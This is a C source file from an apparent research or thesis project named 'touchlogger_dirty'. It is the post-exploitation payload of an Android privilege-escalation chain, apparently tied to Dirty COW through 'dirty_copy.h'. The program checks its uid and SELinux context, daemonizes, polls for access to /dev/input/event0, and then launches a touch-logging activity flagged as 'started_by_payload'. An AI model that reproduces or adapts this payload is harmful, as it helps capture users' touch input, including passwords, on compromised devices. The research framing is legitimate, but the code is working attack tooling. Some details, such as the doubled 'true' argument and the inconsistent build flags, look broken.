//
// Created by kirill on 17.03.17.
//

#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <stdbool.h>

#include "dirty_copy.h"

typedef int getcon_t(char **con);

// TODO: make this depend on project build type
#define PRODUCTION_CODE 0

// TODO: figure out how to get this info from CMake script and pass it here
#define PKNAME "org.leyfer.thesis.touchlogger_dirty"
#define ACTIVITY ".activity.MainActivity"
#define BOOLEAN_EXTRA_KEY "org.leyfer.thesis.extra.started_by_payload true"

int main(int argc, const char** argv)
{
  LOGV("Uid: %d", getuid());
  dlerror();
#ifdef __aarch64__
  void * selinux = dlopen("/system/lib64/libselinux.so", RTLD_LAZY);
#else
  void *selinux = dlopen("/system/lib/libselinux.so", RTLD_LAZY);
#endif
  if (selinux)
  {
    void *getcon = dlsym(selinux, "getcon");
    const char *error = dlerror();
    if (error)
    {
      LOGV("dlsym error %s", error);
    }
    else
    {
      getcon_t *getcon_p = (getcon_t *) getcon;
      char *secontext;
      int ret = (*getcon_p)(&secontext);
      LOGV("Context: %d %s", ret, secontext);
    }
  }

  if (daemon(0, 0) == -1)
  {
    LOGV("Unable to daemonize process: %s!", strerror(errno));
  }

#ifdef PRODUCTION_CODE
  bool called_activity = false;
#endif

  int fd;
  while (1)
  {
    if ((fd = open("/dev/input/event0", O_RDONLY)) == -1)
    {
      LOGV("Unable to open input device: %s", strerror(errno));
      break;
    }
    else
    {
      LOGV("Open input device success!");
      close(fd);
#if PRODUCTION_CODE
      if (!called_activity)
      {
        if (WEXITSTATUS(system("/system/bin/sh -c ps | grep zygote")) == 0)
        {
          LOGV("Zygote resurrected first time!");
          if (system("/system/bin/sh am start -n " PKNAME "/" ACTIVITY " --ez " BOOLEAN_EXTRA_KEY " true"))
          {
            LOGV("Activity called");
            called_activity = true;
          }
          else
          {
            LOGV("Unable to call activity!");
          }
        }
      }
#endif
    }

    sleep(1);
  }

  return 0;
}
